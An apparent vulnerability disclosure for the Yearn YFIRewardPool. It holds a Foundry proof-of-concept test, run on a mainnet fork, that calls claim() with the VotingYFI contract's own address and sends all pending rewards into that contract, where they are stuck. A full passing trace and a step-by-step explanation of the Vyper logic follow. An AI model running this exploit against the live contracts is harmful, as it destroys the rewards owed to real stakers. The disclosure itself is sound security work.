```solidity
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}
interface IYFIRewardPool {
    function token() external view returns (IERC20);
    function claim(address user, bool relock) external returns (uint256);
    function token_last_balance() external view returns (uint256);
    function last_token_time() external view returns (uint256);
    function checkpoint_token() external;
}
interface IVotingYFI {
    function supply() external view returns (uint256);
}
contract YFIRewardPoolExploitTest is Test {
    IYFIRewardPool public rewardPool;
    IVotingYFI public veYFI;
    IERC20 public yfi;
    address constant REWARD_POOL_ADDR = 0xb287a1964AEE422911c7b8409f5E5A273c1412fA;
    address constant VEYFI_ADDR       = 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5;
    uint256 public forkId;
    function setUp() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        forkId = vm.createSelectFork(rpc);
        rewardPool = IYFIRewardPool(REWARD_POOL_ADDR);
        veYFI      = IVotingYFI(VEYFI_ADDR);
        yfi        = rewardPool.token();
    }
    function testExploit_DrainRewardsToVeYFI() public {
        uint256 veSupplyBefore = veYFI.supply();
        assertGt(veSupplyBefore, 0, "veYFI supply must be > 0 on mainnet");
        uint256 poolYfiBefore   = yfi.balanceOf(address(rewardPool));
        uint256 veYfiBefore     = yfi.balanceOf(VEYFI_ADDR);
        uint256 lastTokenBefore = rewardPool.token_last_balance();
        uint256 extraRewards = 10e18;
        deal(address(yfi), address(rewardPool), poolYfiBefore + extraRewards);
        uint256 lastTokenTime = rewardPool.last_token_time();
        vm.warp(lastTokenTime + 2 days);
        rewardPool.checkpoint_token();
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);
        uint256 claimed = rewardPool.claim(VEYFI_ADDR, false);
        vm.stopPrank();
        assertGt(claimed, 0, "claimed reward must be > 0");
        uint256 poolYfiAfter   = yfi.balanceOf(address(rewardPool));
        uint256 veYfiAfter     = yfi.balanceOf(VEYFI_ADDR);
        uint256 veSupplyAfter  = veYFI.supply();
        uint256 lastTokenAfter = rewardPool.token_last_balance();
        assertEq(
            veYfiAfter,
            veYfiBefore + claimed,
            "veYFI contract should receive the claimed YFI"
        );
        assertEq(
            poolYfiAfter,
            poolYfiBefore + extraRewards - claimed,
            "Reward pool YFI balance should go down by claimed"
        );
        assertEq(
            lastTokenAfter,
            lastTokenBefore + extraRewards - claimed,
            "token_last_balance must be debited by claimed"
        );
        assertEq(
            veSupplyAfter,
            veSupplyBefore,
            "veYFI total supply must not change when rewards are stolen"
        );
    }
}
```

```solidity
root@Gandhi:/home/gajnithehero/apikeywith# forge test -vvvv
[⠊] Compiling...
[⠘] Compiling 1 files with Solc 0.8.30
[⠃] Solc 0.8.30 finished in 643.94ms
Compiler run successful!

Ran 1 test for test/test.sol:YFIRewardPoolExploitTest
[PASS] testExploit_DrainRewardsToVeYFI() (gas: 1613626)
Traces:
  [1696026] YFIRewardPoolExploitTest::testExploit_DrainRewardsToVeYFI()
    ├─ [2607] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::supply() [staticcall]
    │   └─ ← [Return] 1561474600102638461746 [1.561e21]
    ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 11829011712181802780 [1.182e19]
    ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5) [staticcall]
    │   └─ ← [Return] 1561474600102638461746 [1.561e21]
    ├─ [2584] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::token_last_balance() [staticcall]
    │   └─ ← [Return] 11829011712181802780 [1.182e19]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 11829011712181802780 [1.182e19]
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 11829011712181802780 [1.182e19]
    ├─ [0] VM::accesses(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   └─ ← [Return] [0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb], []
    ├─ [0] VM::load(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000a429177abc88171c
    ├─ [0] VM::load(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000a429177abc88171c
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 11829011712181802780 [1.182e19]
    ├─ [0] VM::store(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb, 0x000000000000000000000000000000000000000000000000a429177abc88171c)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, fsig: 0x70a08231, keysHash: 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb, slot: 85363065926644718333299107255539404589662226259537563092021243012160868321515 [8.536e76])
    ├─ [0] VM::load(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb) [staticcall]
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000a429177abc88171c
    ├─ [0] VM::store(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xbcb9c87bc43701fc61599de07ba92c77b4ac82d32c053adf4660932d0c5c08eb, 0x0000000000000000000000000000000000000000000000012ef03a7f4670171c)
    │   └─ ← [Return]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 21829011712181802780 [2.182e19]
    ├─ [2538] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::last_token_time() [staticcall]
    │   └─ ← [Return] 1764304811 [1.764e9]
    ├─ [0] VM::warp(1764477611 [1.764e9])
    │   └─ ← [Return]
    ├─ [31110] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::checkpoint_token()
    │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   │   └─ ← [Return] 21829011712181802780 [2.182e19]
    │   ├─ emit CheckpointToken(: 1764477611 [1.764e9], : 10000000000000000000 [1e19])
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [1360954] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::claim(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, false)
    │   ├─ [2756] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::epoch(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000553
    │   ├─ [9212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000004c2a1f08491978000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006390e2670000000000000000000000000000000000000000000000000000000000f63270
    │   ├─ [33425] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1670457600 [1.67e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000004c2a1f0849197800
    │   ├─ [23759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1671062400 [1.671e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000168644688ef0cc5b00
    │   ├─ [25805] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1671667200 [1.671e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019c36f319452775100
    │   ├─ [21333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1672272000 [1.672e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019cad28463ef929a80
    │   ├─ [21713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1672876800 [1.672e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019b4931b7637827880
    │   ├─ [25379] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1673481600 [1.673e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000198c904faac302cd00
    │   ├─ [19759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1674086400 [1.674e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001996be83bb48590380
    │   ├─ [19287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1674691200 [1.674e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019e71f23a7b2810680
    │   ├─ [23759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1675296000 [1.675e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a823319d392812780
    │   ├─ [19287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1675900800 [1.675e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001afce7e0bd7a044d00
    │   ├─ [17287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1676505600 [1.676e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a9a323847b0e82580
    │   ├─ [17713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1677110400 [1.677e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a4a7e684014f26580
    │   ├─ [25805] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1677715200 [1.677e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a55bea0cf14ad2e80
    │   ├─ [17287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1678320000 [1.678e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019f2ec726aed191b80
    │   ├─ [21759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1678924800 [1.678e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a16bb05c3f7777200
    │   ├─ [19759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1679529600 [1.679e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000019a57d70ba575fb400
    │   ├─ [21333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1680134400 [1.68e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000192cbd3e9b745b4400
    │   ├─ [17713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1680739200 [1.68e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000018c534c1ce9f447900
    │   ├─ [19713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1681344000 [1.681e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000018617ef8a2bc52a800
    │   ├─ [21667] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1681948800 [1.681e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000017ea57adf258dca300
    │   ├─ [27425] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1682553600 [1.682e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001776783fec1f0f2700
    │   ├─ [19333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1683158400 [1.683e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001746691be00d4b9900
    │   ├─ [17805] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1683763200 [1.683e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000016e9ab6b8020def780
    │   ├─ [19759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1684368000 [1.684e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001656534db86f8cae80
    │   ├─ [21333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1684972800 [1.684e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000015ed42f08c030e6080
    │   ├─ [19759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1685577600 [1.685e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000157ba50736fb41e500
    │   ├─ [21759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1686182400 [1.686e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000150c6105177c7c5180
    │   ├─ [19667] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1686787200 [1.686e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001480a9784c9af1fe80
    │   ├─ [23333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1687392000 [1.687e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000140ccf142c9ee84800
    │   ├─ [19759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1687996800 [1.687e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000140c57259b35d4ea00
    │   ├─ [21759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1688601600 [1.688e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000013fb6d6c8686aa1400
    │   ├─ [19713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1689206400 [1.689e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000138d53e63844341a00
    │   ├─ [21333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1689811200 [1.689e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000013384a143629e28c00
    │   ├─ [17241] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1690416000 [1.69e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001306bab600c1060080
    │   ├─ [15667] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1691020800 [1.691e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000012aa546349409a9400
    │   ├─ [19241] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1691625600 [1.691e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001244a00ae9de47d780
    │   ├─ [17195] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1692230400 [1.692e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000014be735ee7f88ed480
    │   ├─ [25333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1692835200 [1.692e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000145e0cae1993e10800
    │   ├─ [19333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1693440000 [1.693e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000157c935f139a1ff900
    │   ├─ [17287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1694044800 [1.694e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000015239975928f170e80
    │   ├─ [17713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1694649600 [1.694e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000014d9293e54dfa75600
    │   ├─ [23759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1695254400 [1.695e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000164f1059f26602cd80
    │   ├─ [19713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1695859200 [1.695e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000016577b63396f90f980
    │   ├─ [23287] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1696464000 [1.696e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000016dc333e74d3f0ff80
    │   ├─ [19667] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1697068800 [1.697e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001a91867de35f743e00
    │   ├─ [21713] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1697673600 [1.697e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001aae770166c4583380
    │   ├─ [31805] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1698278400 [1.698e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001e41a3c0466a47f800
    │   ├─ [21805] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1698883200 [1.698e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001e0932aa8c43d6c580
    │   ├─ [21333] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1699488000 [1.699e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001e210bf289f8b84380
    │   ├─ [25759] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1700092800 [1.7e9]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001ec792a15d3ac92a00
    │   ├─ emit Claimed(param0: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, param1: 12389964557386040528 [1.238e19], param2: 1700697600 [1.7e9], param3: 1363)
    │   ├─ [6252] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transfer(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 12389964557386040528 [1.238e19])
    │   │   ├─ emit Transfer(from: 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, to: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 12389964557386040528 [1.238e19])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 12389964557386040528 [1.238e19]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   └─ ← [Return] 9439047154795762252 [9.439e18]
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5) [staticcall]
    │   └─ ← [Return] 1573864564660024502274 [1.573e21]
    ├─ [607] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::supply() [staticcall]
    │   └─ ← [Return] 1561474600102638461746 [1.561e21]
    ├─ [584] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::token_last_balance() [staticcall]
    │   └─ ← [Return] 9439047154795762252 [9.439e18]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 167.99s (163.47s CPU time)

Ran 1 test suite in 168.00s (167.99s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## some details:

### global veYFI supply stored under self (VotingYFI)

in veYFI.vy, global supply is tracked using the contract’s own address (`self`) as the “user key” in epoch nd `point_history`:

on init:

```vyper
self.point_history[self][0].blk = block.number
self.point_history[self][0].ts = block.timestamp
```  

- Global supply checkpoints use that same `self` address:

```vyper
epoch: uint256 = self.epoch[self]
if epoch > 0:
    last_point = self.point_history[self][epoch]
...
self.point_history[self][epoch] = last_point
self.epoch[self] = epoch
``` 
- Total supply is defined as the balance of this special “user”:

```vyper
def totalSupply(ts: uint256 = block.timestamp) -> uint256:
    return self._balanceOf(self, ts)
``` 

- and `balanceOf(user, ts)` just wraps `_balanceOf(user, ts)`; so:

> `balanceOf(VotingYFI.address, ts) == total veYFI supply at ts`

### reward pool uses that same address for `ve_supply`

in `YFIRewardPool.vy` the total veYFI supply per week is tracked in `ve_supply[t]`

crucially, it is derived using `VEYFI.address` as the user key:

```vyper
def _checkpoint_total_supply(self):
    t: uint256 = self.time_cursor
    rounded_timestamp: uint256 = block.timestamp / WEEK * WEEK
    VEYFI.checkpoint()

    for i in range(40):
        if t > rounded_timestamp:
            break
        else:
            epoch: uint256 = VEYFI.find_epoch_by_timestamp(VEYFI.address, t)
            pt: Point = VEYFI.point_history(VEYFI.address, epoch)

            dt: int128 = 0
            if t > pt.ts:
                dt = convert(t - pt.ts, int128)

            self.ve_supply[t] = convert(max(pt.bias - pt.slope * dt, 0), uint256)

        t += WEEK

    self.time_cursor = t
``` 
cuz `point_history[VEYFI.address]` is exactly where global supply snapshots live, this means:

> `ve_supply[week] == total veYFI supply at that week`

### claim logic is fully generic over `addr`

Internal claim:

```vyper
@internal
def _claim(addr: address, last_token_time: uint256) -> uint256:
    ...
    max_user_epoch: uint256 = VEYFI.epoch(addr)
    if max_user_epoch == 0:
        return 0

    week_cursor: uint256 = self.time_cursor_of[addr]
    ...
    balance_of: uint256 = VEYFI.balanceOf(addr, week_cursor)
    ...
    to_distribute += balance_of * self.tokens_per_week[week_cursor] / self.ve_supply[week_cursor]
``` 
public entrypoint:

```vyper
@external
@nonreentrant('lock')
def claim(user: address = msg.sender, relock: bool = False) -> uint256:
    ...
    amount: uint256 = self._claim(user, last_token_time)
    if amount != 0:
        if relock and (msg.sender == user or self.allowed_to_relock[user][msg.sender]):
            YFI.approve(VEYFI.address, amount)
            VEYFI.modify_lock(amount, 0, user)
        else:
            assert YFI.transfer(user, amount)
        self.token_last_balance -= amount
```
important points:

- `claim` is external and fully permissionless, no auth
- `user` arg is freely set by caller; no check that `user != VEYFI.address`
- `_claim` uses `addr` for both:
  - `VEYFI.epoch(addr)`
  - `VEYFI.balanceOf(addr, week_cursor)`
  - `time_cursor_of[addr]`

so nothing prevents someone from calling `claim(VEYFI.address, false)`

## how the vulnerability works (step‑by‑step)

consider an attacker calling:

> `claim(user = VEYFI.address, relock = False)`

### 3.1. Setup state

let:

- There is at least one veYFI lock -> global veYFI supply > 0
- some rewards have already been accumulated in the pool:
  - via penalties from `VotingYFI.withdraw` -> `REWARD_POOL.burn(penalty)`   
  - and distributed into `tokens_per_week` by `_checkpoint_token`

### in `claim`

1. `claim` sees `block.timestamp >= self.time_cursor` and calls `_checkpoint_total_supply()`  -> this populates `self.ve_supply[week]` using global supply under `VEYFI.address` 

2. It also may call `_checkpoint_token()` to update `tokens_per_week`

3. Then it calls `_claim(user, last_token_time)` with `user = VEYFI.address`

### inside `_claim` for `addr = VEYFI.address`

for each reward week:

- `max_user_epoch = VEYFI.epoch(VEYFI.address)`  -> this is global epoch maintained for total supply 

- `balance_of = VEYFI.balanceOf(VEYFI.address, week_cursor)`  -> by design this equals total veYFI supply at that timestamp

- `ve_supply[week_cursor]` was computed in `_checkpoint_total_supply` exactly from that same global supply, so:

> `balance_of == ve_supply[week_cursor]` for weeks with positive supply

rherefore, for that week:

```bash
user_share = balance_of * tokens_per_week[week] / ve_supply[week]
           = totalSupply * tokens_per_week / totalSupply
           = tokens_per_week
```

so this single “user” (the VotingYFI contract address) gets 100% of that week’s YFI rewards

- loop continues (up to 50 weeks at a time) until `week_cursor >= last_token_time`
- so `_claim(VEYFI.address, ...)` effectively drains all currently claimable rewards for all weeks where global supply > 0

### Payout

back in claim:

```vyper
assert YFI.transfer(user, amount)  # user == VEYFI.address
self.token_last_balance -= amount
```
- all those YFI are transferred out of the reward pool to the `VotingYFI` contract
- `token_last_balance` is reduced by `amount`, so from the pool’s perspective , those rewards are “legitimately paid out” and will never be re-accounted

## why the YFI is basically burned

now look at what happens inside `VotingYFI` with incoming YFI:

- these transfers do not go through `modify_lock` -> no user’s `locked[addr].amount` is updated, 
- there is no sweep/rescue function in `VotingYFI` to send arbitrary ERC20 balance elsewhere 
- the only ways YFI ever leaves `VotingYFI` are:
  1. `withdraw()` for a user:
     - `YFI.transfer(msg.sender, old_locked.amount - penalty)`
